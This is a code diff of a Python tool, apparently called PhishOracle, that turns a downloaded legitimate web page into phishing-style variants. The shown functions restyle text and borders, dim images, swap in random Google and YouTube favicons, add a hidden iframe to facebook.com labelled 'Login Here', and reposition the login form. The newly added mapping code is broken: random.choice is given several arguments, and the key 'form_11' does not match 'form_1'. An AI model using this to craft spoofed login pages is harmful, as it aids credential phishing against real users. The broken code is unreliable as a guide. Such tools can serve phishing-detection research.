-    # with open(write_file_name, 'rb') as f_16_input:
-    #     function_16_contents = f_16_input.read()
-    #     f16_soup = BeautifulSoup(function_16_contents, 'html.parser')
-
-    f16_soup = obtained_soup_here
-    body_tag = f16_soup.find('body')
-    if body_tag.has_attr('style'):
-        body_tag_present_style = body_tag['style']
-        body_tag_additional_styling = body_tag_present_style + "width: 100%;"
-        body_tag['style'] = body_tag_additional_styling
-    else:
-        body_tag['style'] = "width: 100%;"
-
-    for div_tag in f16_soup.find_all('div'):
-        if div_tag.has_attr('style'):
-            div_tag_styles_present = div_tag['style']
-            div_tag_additional_styling = div_tag_styles_present + "border-width: 2px; border-color: grey;"
-            div_tag['style'] = div_tag_additional_styling
-        else:
-            div_tag['style'] = "border-width: 2px; border-color: grey;"
-
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
-
-    function_16_soup = copy.deepcopy(f16_soup.prettify())
-
-    with open(write_file_name, 'w', encoding='utf-8') as f_16_output:
-        f_16_output.write(str(function_16_soup))
-
-
-'''
-========================================    PHASE 3 (FUNCTION 16) ENDS HERE  ========================================
-'''
-
-'''
-=======================================    PHASE 3 (FUNCTION 17) BEGINS HERE  =======================================
-In this feature we change the text styling like: align center, capitalize, shadow, ... in the html file
-'''
-
-
-def function_17(target_file, obtained_soup_here):
-    print("Adding feature 'Text Styling'")
-    write_file = phishing_folder_path
-    write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_17_input:
-    #     function_17_contents = f_17_input.read()
-    #     f17_soup = BeautifulSoup(function_17_contents, 'html.parser')
-
-    f17_soup = obtained_soup_here
-    # for text_tag in f17_soup.find_all('h2' or 'p' or 'h1'):
-    #     text_tag[
-    #         'style'] = "text-align: center; color: blue; text-transform: capitalize; text-shadow: 1px 1px grey;"
-    body_tag = f17_soup.find('body')
-    if body_tag.has_attr('style'):
-        body_tag_present_style = body_tag['style']
-        body_tag_additional_styling = body_tag_present_style + "width: 100%;"
-        body_tag['style'] = body_tag_additional_styling
-    else:
-        body_tag['style'] = "width: 100%;"
-
-    for text_tag in f17_soup.find_all('h2' or 'p' or 'h1'):
-        if text_tag.has_attr('style'):
-            text_tag_present_style = text_tag['style']
-            text_tag_additional_styling = text_tag_present_style + "text-align: center; color: #4A667E; text-transform: capitalize; text-shadow: 1px 1px grey;"
-            text_tag['style'] = text_tag_additional_styling
-        else:
-            text_tag[
-                'style'] = "text-align: center; color: #4A667E; text-transform: capitalize; text-shadow: 1px 1px grey;"
-
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
-
-    function_17_soup = copy.deepcopy(f17_soup.prettify())
-
-    with open(write_file_name, 'w', encoding='utf-8') as f_17_output:
-        f_17_output.write(str(function_17_soup))
-
-
-'''
-========================================    PHASE 3 (FUNCTION 17) ENDS HERE  ========================================
-'''
-
-'''
-=======================================    PHASE 3 (FUNCTION 18) BEGINS HERE  =======================================
-In this feature we replace the logo with our image keeping the same dimension as specified by developer in the html file
-'''
-
-
-def function_18(target_file, obtained_soup_here):
-    print("Adding feature 'Replace logo image'")
-    write_file = phishing_folder_path
-    write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_18_input:
-    #     function_18_contents = f_18_input.read()
-    #     f18_soup = BeautifulSoup(function_18_contents, 'html.parser')
-
-    f18_soup = obtained_soup_here
-
-    for img_tag in f18_soup.find_all('img'):
-        if img_tag.has_attr('style'):
-            img_tag_present_style = img_tag['style']
-            img_tag_additional_styling = img_tag_present_style + "opacity:0.7;"
-            img_tag['style'] = img_tag_additional_styling
-        else:
-            img_tag['style'] = "opacity:0.7;"
-
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
-
-    function_18_soup = copy.deepcopy(f18_soup.prettify())
-
-    with open(write_file_name, 'w', encoding='utf-8') as f_18_output:
-        f_18_output.write(str(function_18_soup))
-
-
-'''
-========================================    PHASE 3 (FUNCTION 18) ENDS HERE  ========================================
-'''
-
-'''
-=======================================    PHASE 3 (FUNCTION 19) BEGINS HERE  =======================================
-In this feature we replace the favicon in the html file
-'''
-
-
-# from PIL import Image
-# import requests
-
-
-def function_19(target_file, obtained_soup_here):
-    print("Adding feature 'Favicon'")
-
-    # '''Download the Favicon from web page'''
-    # icon_link = None
-    # for link in obtained_soup_here.find_all("link", attrs={'rel': re.compile("^(shortcut icon|icon)$", re.I)}):
-    #     icon_link = link.get("href", None)
-    #     break
-    #
-    # if icon_link:
-    #     response = requests.get(icon_link)
-    #     with open("favicon.ico", "wb") as f:
-    #         f.write(response.content)
-    #
-    # else:
-    #     print("Favicon not found")
-
-    f19_soup = obtained_soup_here
-    write_file = phishing_folder_path
-    write_file_name = os.path.join(write_file, str(target_file))
-
-    # favicon_tag = f19_soup.find_all('link', attrs={'rel': re.compile("^(shortcut icon|icon)$", re.I)})
-    # # favicon_content = requests.get(favicon_tag['href']).content
-    # # with open('favicon.ico', 'wb') as favicon_file_input:
-    # #     favicon_file_input.write(favicon_ontent)c
-    # # favicon_file = open('favicon.ico', 'rb')
-    # # favicon_tag['href'] = favicon_file
-    # icon_link = f19_soup.find_all('link', attrs={'rel': re.compile("^(shortcut icon|icon)$", re.I)})
-    # icon_href_link = icon_link['href']
-    # icon = urllib.request.urlopen(icon_href_link)
-    #
-    # with open('web_page_favicon.png', 'wb') as f:
-    #     f.write(icon.read())
-    #
-    # from PIL import Image
-    # im_rgb = Image.open('web_page_favicon.png')
-    # im_rgba = im_rgb.copy()
-    # im_rgba.putalpha(128)
-    # im_rgba.save('lighter_web_page_favicon.png')
-    #
-    # new_favicon_link = f19_soup.new_tag("link", href="lighter_web_page_favicon.png", rel="icon")
-    # icon_link.replace_with(new_favicon_link)
-    favicon_link = f19_soup.find("link", rel="icon") or f19_soup.find("link", rel="shortcut icon")
-
-    if favicon_link:
-        # # get the URL of the favicon
-        # favicon_url = favicon_link["href"]
-        # print(favicon_url)
-        # print(type(favicon_url))
-        #
-        # if favicon_url.startswith('https'):
-        #     try:
-        #         # download the favicon
-        #         response = requests.get(favicon_url)
-        #     except urllib.error.HTTPError as e:
-        #         print('HTTP Error: {}'.format(e.code))
-        #     except urllib.error.URLError as e:
-        #         print('URL Error: {}'.format(e.reason))
-        #     else:
-        #         with open("favicon.ico", "wb") as f:
-        #             f.write(response.content)
-        #
-        #         # make the favicon lighter
-        #         from PIL import Image
-        #         with open("favicon.ico", "rb") as f:
-        #             image = Image.open(f)
-        #             grayscale_image = image.convert("L")
-        #             adjusted_image = Image.eval(grayscale_image, lambda x: x + 50)
-        #             adjusted_image.save("lighter_favicon.ico")
-        #
-        #         # update the favicon link tag with the URL of the new lighter favicon
-        #         new_favicon_link = f19_soup.new_tag("link", href="lighter_favicon.ico", rel="icon", type="image/x-icon")
-        #         favicon_link.replace_with(new_favicon_link)
-        # else:
-        favicon_images = ['https://ssl.gstatic.com/docs/presentations/images/favicon5.ico',
-                          'https://storage.googleapis.com/operating-anagram-8280/apple-touch-icon.png',
-                          'https://www.youtube.com/s/desktop/5737b328/img/favicon.ico']
-
-        # with open(write_file_name, 'rb') as f_19_input:
-        #     function_19_contents = f_19_input.read()
-        #     f19_soup = BeautifulSoup(function_19_contents, 'html.parser')
-
-        for favicon_item in f19_soup.find_all('link',
-                                              attrs={'rel': re.compile("^(shortcut icon|icon)$", re.I)}):
-            favicon_item['href'] = random.choice(favicon_images)
-
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
-
-    function_19_soup = copy.deepcopy(f19_soup.prettify())
-
-    with open(write_file_name, 'w', encoding='utf-8') as f_19_output:
-        f_19_output.write(str(function_19_soup))
-
-
-'''
-========================================    PHASE 3 (FUNCTION 19) ENDS HERE  ========================================
-'''
-
-'''
-=======================================    PHASE 3 (FUNCTION 20) BEGINS HERE  =======================================
-In this feature we add the iFrame in the html file
-'''
-
-
-def function_20(target_file, obtained_soup_here):
-    print("Adding feature 'IFrame'")
-    write_file = phishing_folder_path
-    write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_20_input:
-    #     function_20_contents = f_20_input.read()
-    #     f20_soup = BeautifulSoup(function_20_contents, 'lxml')
-
-    f20_soup = obtained_soup_here
-    iframe_tag = f20_soup.new_tag('iframe')
-    iframe_tag['src'] = "https://facebook.com"
-    iframe_tag['style'] = "display:none;"
-    iframe_tag.string = 'Login Here'
-    f20_soup.html.body.append(iframe_tag)
-
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
-
-    function_20_soup = copy.deepcopy(f20_soup.prettify())
-
-    with open(write_file_name, 'w', encoding='utf-8') as f_20_output:
-        f_20_output.write(str(function_20_soup))
-
-
-'''
-========================================    PHASE 3 (FUNCTION 20) ENDS HERE  ========================================
-'''
-
-# '''
-# =======================================    PHASE 3 (FUNCTION 21) BEGINS HERE  =======================================
-# In this feature we add line thickness as visual feature in the html file
-# '''
-#
-#
-# def function_21(target_file):
-#     print("Adding feature 'Line Colored Thickness'")
-#     write_file = "\\xampp\\htdocs\\phishingTool\\PhishingSites\\"
-#     write_file_name = os.path.join("c:" + write_file, str(target_file) + ".html")
-#
-#     with open(write_file_name, 'rb') as f_21_input:
-#         function_21_contents = f_21_input.read()
-#         f21_soup = BeautifulSoup(function_21_contents, 'lxml')
-#         hr_tag = f21_soup.new_tag('hr')
-#         hr_tag['style'] = "position:relative; top:20px; border:none; height:12px; background:grey; " \
-#                           "margin-bottom:20px; "
-#         f21_soup.html.body.append(hr_tag)
-#
-#     '''
-#     Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-#     '''
-#     import copy
-#
-#     function_21_soup = copy.deepcopy(f21_soup.prettify())
-#
-#     with open(write_file_name, 'w', encoding='utf-8') as f_21_output:
-#         f_21_output.write(str(function_21_soup))
-#
-#
-# '''
-# ========================================    PHASE 3 (FUNCTION 21) ENDS HERE  ========================================
-# '''
-
-'''
-=======================================    PHASE 3 (FUNCTION 22) BEGINS HERE  =======================================
-In this feature we swap the position of form and its siblings in the html file
-'''
-
-
-def function_22(target_file, obtained_soup_here):
-    print("Adding feature 'Swap Positions'")
-    write_file = phishing_folder_path
-    write_file_name = os.path.join(write_file, str(target_file))
-
-    f22_soup = obtained_soup_here
-
-    # Find the form tag and its sibling
-    found_form = f22_soup.find('form')
-
-    if found_form.find_previous_sibling():
-        sibling_tag = found_form.find_previous_sibling()
-        sibling_tag.insert_before(found_form)
-    if found_form.find_next_sibling():
-        sibling_tag = found_form.find_next_sibling()
-        sibling_tag.insert_after(found_form)
-
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
-
-    function_22_soup = copy.deepcopy(f22_soup.prettify())
-
-    with open(write_file_name, 'w', encoding='utf-8') as f_22_output:
-        f_22_output.write(str(function_22_soup))
-
-
-'''
-========================================    PHASE 3 (FUNCTION 22) ENDS HERE  ========================================
-'''
-
-
-one_out_of_three = [function_1, function_14, function_15]
-all_functions = {'a_href_status_ff': random.choice(one_out_of_three), '_form_': function_8,
-                 'a_dis_button': function_11, 'h1_text': function_17,
-                 'h2_text': function_17, 'p_text': function_17,
-                 'logo_img': function_18}
-
-function_list = [function_3, function_4, function_5, function_6, function_7, function_9, function_10,
-                 function_16, function_19, function_20]
-function_list_names = ['dummy_comments', 'dummy_div', 'dummy_script', 'dummy_link', 'body_opacity', 'dummy_img',
-                       'dummy_anchor', 'border_styling', 'change_favicon', 'iFrame']
-
-function_list_dictionary = {'a_href_status_ff': random.choice(['function_1', 'function_14', 'function_15']),
-                            'dummy_comments': 'function_3', 'dummy_div': 'function_4', 'dummy_script': 'function_5',
-                            'dummy_link': 'function_6', 'body_opacity': 'function_7', '_form_': 'function_8',
-                            'dummy_img': 'function_9', 'dummy_anchor': 'function_10', 'a_dis_button': 'function_11',
-                            'border_styling': 'function_16', 'p_text': 'function_17', 'logo_img': 'function_18',
-                            'change_favicon': 'function_19', 'iFrame': 'function_20'}
-
+# one_out_of_five = [function_1, function_3, function_5, function_8, function_10]
+# all_functions = {'a_href_status_ff': random.choice(one_out_of_five), '_form_': function_8,
+#                  'a_dis_button': function_11, 'h1_text': function_17,
+#                  'h2_text': function_17, 'p_text': function_17,
+#                  'logo_img': function_18}
+
+# function_list = [function_3, function_4, function_5, function_6, function_7, function_9, function_10,
+#                  function_16, function_19, function_20]
+# function_list_names = ['dummy_comments', 'dummy_div', 'dummy_script', 'dummy_link', 'body_opacity', 'dummy_img',
+#                        'dummy_anchor', 'border_styling', 'change_favicon', 'iFrame']
+
+# function_list_dictionary = {'a_href_status_ff': random.choice(['function_1', 'function_14', 'function_15']),
+#                             'dummy_comments': 'function_3', 'dummy_div': 'function_4', 'dummy_script': 'function_5',
+#                             'dummy_link': 'function_6', 'body_opacity': 'function_7', '_form_': 'function_8',
+#                             'dummy_img': 'function_9', 'dummy_anchor': 'function_10', 'a_dis_button': 'function_11',
+#                             'border_styling': 'function_16', 'p_text': 'function_17', 'logo_img': 'function_18',
+#                             'change_favicon': 'function_19', 'iFrame': 'function_20'}
+
+one_out_of_five_a = [function_1, function_3, function_5, function_8, function_10]
+all_functions = {'a_href_1': random.choice(one_out_of_five_a), 'a_href_2': function_4, 'form_11': function_7, 'form_2': function_9, 'form_3': function_11,
+                'form_4': function_12, 'p_h_span_1': function_6, 'p_h_span_2': function_14, 'body': function_13, 'img_svg': function_15}
+function_list_dictionary = {'a_href_1': random.choice('function_1', 'function_3', 'function_5', 'function_8', 'function_10'), 
+                            'a_href_2': 'function_4', 'form_1': 'function_7', 'form_2': 'function_9', 'form_3': 'function_11',
+                            'form_4': 'function_12', 'p_h_span_1': 'function_6', 'p_h_span_2': 'function_14', 'body': 'function_13',
+                            'img_svg': 'function_15'}
 
 file_name = "legitimate_file.html"
 target_file_name = file_name
@@ -1568,16 +1126,6 @@ def generate_features(user_input):
         Using webbrowser and os libraries locate the file and open it in the web browser
         '''
 
-        # webbrowser.open_new_tab(file_name)
-        # function_1(target_file_name)
-        #
-        # function_call_list = [function_2, function_4, function_5, function_6, function_7, function_9,
-        #                       function_10, function_11, function_12]
-        #
-        # new_call_list = random.sample(function_call_list, (k - 1))
-        # for j in range(len(new_call_list)):
-        #     new_call_list[j](target_file_name)
-
         functions_to_call = []
 
         # populate possible feature names
@@ -1590,55 +1138,24 @@ def generate_features(user_input):
             # total_functions = 14
             # for function_iterator in range(0, total_functions):
             if soup.find_all('a'):
-                # if 'a_href' or 'a_en_dis' or 'a_dis' or 'a_status' or 'a_ff' or 'a_look_alike' not in functions_to_call:
-                functions_to_call.append('a_href_status_ff')
-                # functions_to_call.append('a_en_dis')
-                functions_to_call.append('a_dis_button')
-                # functions_to_call.append('a_status')
-                # functions_to_call.append('a_ff')
-                # functions_to_call.append('a_look_alike')
-            if soup.find_all('img'):
-                # if 'img' not in functions_to_call:
-                # functions_to_call.append('img')
-                functions_to_call.append('logo_img')
+                functions_to_call.append('a_href_1')
+                functions_to_call.append('a_href_2')
+            if soup.find("p") or soup.find("h1") or soup.find("h2") or soup.find("h3") or soup.find("span"):
+                functions_to_call.append('p_h_span_1')
+                functions_to_call.append('p_h_span_2')
             if soup.find_all('form'):
-                # if 'form' not in functions_to_call:
-                functions_to_call.append('_form_')
-                # functions_to_call.append('swap_form')
-            if soup.find_all('h1'):
-                # if 'h1' not in functions_to_call:
-                # functions_to_call.append('h1')
-                functions_to_call.append('h1_text')
-            if soup.find_all('h2'):
-                # if 'h2' not in functions_to_call:
-                # functions_to_call.append('h2')
-                functions_to_call.append('h2_text')
-            if soup.find_all('p'):
-                # if 'p' not in functions_to_call:
-                # functions_to_call.append('p')
-                functions_to_call.append('p_text')
+                functions_to_call.append('form_1')
+                functions_to_call.append('form_2')
+                functions_to_call.append('form_3')
+                functions_to_call.append('form_4')
+            if soup.find("body"):
+                functions_to_call.append('body')
+            if soup.find("img") or soup.find("svg") or soup.find("a"):
+                functions_to_call.append('img_svg')
         # print(functions_to_call)
         # print(type(all_functions))
         # print(type(functions_to_call))
         # print(functions_to_call)
-        '''
-        This code is not required from this
-        '''
-        # for key in functions_to_call:
-        #     if key in all_functions:
-        #         print(all_functions[key])
-        #         function_list.append(all_functions[key])
-        #
-        # # print('Function list possible are:')
-        # # print(function_list)
-        #
-        # function_list_set = set(function_list)
-        # print(function_list_set)
-        # new_function_list = list(function_list_set)
-        # print(new_function_list)
-        '''
-        to this
-        '''
 
         possible_features = functions_to_call + function_list_names
 
@@ -1663,17 +1180,8 @@ def generate_final_html(selected_features):
     '''
     Now the selected user features need to be called
     '''
-    # k = len(features_to_add)
-    # for key in functions_to_call:
-    #     if key in all_functions:
-    #         function_list.append(all_functions[key])
-    #
-    # function_list_set = set(function_list)
-    # new_function_list = list(function_list_set)
-    # print(new_function_list)
-
     # print(function_list)
-    write_file = "E:\\Complete_Python\\_PhishOracle_Webapp\\"
+    write_file = "PATH_TO_SAVE_LEGITIMATE_FILE"
     write_file_name = os.path.join(write_file, str(target_file_name))
 
     function_2(target_file_name)
@@ -1691,16 +1199,5 @@ def generate_final_html(selected_features):
             function_name = function_list_dictionary[feature]
             function_to_call = globals()[function_name]
             function_to_call(target_file_name, new_soup)
-
-    # for j in range(len(new_call_list)):
-    #     # print(new_call_list[j])
-    #     # print("Calling function " + str(new_function_list[j]))
-    #     print("---------------------------------------------")
-    #     new_call_list[j](target_file_name, new_soup)
-    #
-    #     with open(write_file_name, 'rb') as file_input_again:
-    #         file_contents_again = file_input_again.read()
-    #         new_contents_soup = BeautifulSoup(file_contents_again, 'lxml')
-    #     new_soup = new_contents_soup
 
     return final_html
